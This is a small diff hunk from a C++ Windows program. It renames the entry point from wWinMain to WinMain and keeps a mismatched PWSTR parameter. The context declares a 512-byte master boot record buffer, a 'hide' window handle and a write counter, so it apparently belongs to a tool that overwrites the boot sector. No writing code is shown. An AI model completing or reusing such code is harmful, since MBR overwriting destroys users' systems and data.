@@ -2,7 +2,7 @@
 using namespace std;
 #define MBR_SIZE 512
 
-int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
     HWND hide;
     DWORD write;
     char mbrData[MBR_SIZE]; 
